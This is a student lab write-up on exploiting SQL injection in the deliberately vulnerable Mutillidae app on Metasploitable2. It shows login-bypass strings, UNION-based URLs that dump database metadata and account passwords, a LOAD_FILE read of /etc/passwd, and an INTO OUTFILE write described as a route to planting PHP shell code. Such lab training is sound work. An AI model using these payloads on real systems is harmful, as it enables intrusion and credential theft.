# LAB08: SQL Injection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 


Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/91521b9b-e052-4c87-88fc-82604df9a016)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/1c6ad920-1dd5-4403-a6aa-0fe5dc8c1a4c)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/1569c483-df10-443a-85f7-653f2f379f7f)


Click on the menu Login/Register and register for an account

![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/72e08b91-7c77-4ba3-af29-98f3f2ab218b)

Click on the link “Please register here”

![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/224a8c8f-9955-4d6f-88f1-2ca8592b9306)


Click on “Create Account” to display the following page:

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![Screenshot 2024-05-09 173650](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/886245e0-0cd9-4565-a14f-0055d687beac)


Click “Login”. The logged in page will show as below:

![Screenshot 2024-05-09 173716](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/116ada86-7beb-4087-ad4f-cf484b034a13)


## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give varshini’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/3d98e7bf-92ed-4fa7-9800-712821140a45)



Click the login button and you will see it enter into the administrator page. 

![Screenshot 2024-05-09 173716](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/9e9c486c-c20c-4298-8246-1233b0e6a4f8)


## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 


![Screenshot 2024-05-09 174132](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/af33c249-8da5-49b0-9260-bc09c15352b6)

![Screenshot 2024-05-09 174346](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/2c401de5-24fe-43fd-a776-f0d4055dbb98)

![Screenshot 2024-05-09 174402](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/18996313-c0c1-46b6-9026-6e191360ae27)

![image](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/26357de2-61a1-4131-9aaa-b6068916b76e)

![Screenshot 2024-05-09 174402](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/e5a9599e-fd1b-46f0-93fc-7c1c106cd309)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 




Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=varshini%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-09 175631](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/90ba6e01-747d-46a8-b938-0206959cd41f)



After adding the order by 6 into the existing url , the following error statement will be obtained: 

![Screenshot 2024-05-09 175726](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/7474c8e9-3fdd-46f8-bd22-44c9c4af7e25)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6. 


![Screenshot 2024-05-09 175811](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/c2aa4a4e-cb37-4094-86f8-9de2f63ae22c)


As it is having 5 columns the query worked fine and it provides the correct result


![Screenshot 2024-05-09 175841](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/a3f15384-2419-4279-bdc5-78373daf23a1)



Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![Screenshot 2024-05-09 180622](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/bdd56714-4f75-495d-a4e7-abcc77eca2ea)


As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 

![Screenshot 2024-05-09 180644](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/04c1ef18-2b86-453d-bd5b-b7c048b38328)


Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=varshini%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-09 181622](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/53fa28a7-1573-49dd-a1af-c5af0d1587d4)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=varshini%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-09 182038](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/3cef4dd3-70da-4923-ac65-c1a3399bb406)


The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![Screenshot 2024-05-09 191647](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/3435d2c2-145e-4310-b29a-9274e8ac8166)

The column names of the accounts is displayed below for the following url:

http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=varshini%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-09 182623](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/b15c45a9-b429-4161-8903-95c1070ce42d)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=varshini%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-09 184459](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/dc828c14-579d-4d0c-a319-99d97b7d4aa6)


## Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=varshini%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-09 184631](https://github.com/VARSHINI22009118/sqlinjection/assets/119401150/b3a9485b-308c-459a-a466-aa167d54eef3)



the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
